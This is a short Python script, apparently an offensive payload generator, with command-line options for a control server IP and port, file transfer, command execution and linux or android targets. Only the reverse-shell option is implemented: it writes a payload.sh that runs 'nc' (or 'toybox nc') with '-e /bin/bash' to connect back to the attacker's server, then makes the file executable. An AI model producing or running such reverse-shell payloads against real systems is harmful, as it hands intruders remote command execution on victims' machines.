import argparse
import os

arg_parser = argparse.ArgumentParser(description="Generate some payloads")
arg_parser.add_argument("-r", action="store_true",
    help="Create a reverse shell")
arg_parser.add_argument("-i", action="store", 
    help="Control server IP address")
arg_parser.add_argument("-p", action="store",
    help="Control server port", default=8888)
arg_parser.add_argument("-o", action="store",
    help="Output file")
arg_parser.add_argument("-d", action="store",
    help="Download file <path>")
arg_parser.add_argument("-u", action="store",
    help="Upload file <path>")
arg_parser.add_argument("-z", action="store_true",
    help="Get system information")
arg_parser.add_argument("-a", default="x86",
    help="architecture: x86|arm")
arg_parser.add_argument("-c", action="store",
    help="command to execute")
arg_parser.add_argument("-m", default="linux",
    help="Machine type: linux|android")
arg_parser.add_argument("--ndk", help="Path to NDK")
arg_parser.add_argument("--gcc", default="gcc",
    help="Path to GCC")   
arg_parser.add_argument("sources", nargs=1)
args = arg_parser.parse_args()

def reverse_shell():
    shellcode = ''
    if args.a == "x86":
        shellcode = "nc " + args.i + " " + args.p + " -e /bin/bash"
    elif args.a == "arm":
        shellcode = "toybox nc " + args.i + " " + args.p + " -e /bin/bash"
    else:
        print("Invalid architecture specified")
    f = open("payload.sh", "w")
    f.write(shellcode)
    f.close()
    os.chmod("payload.sh", 777)

if args.r:
    reverse_shell()


    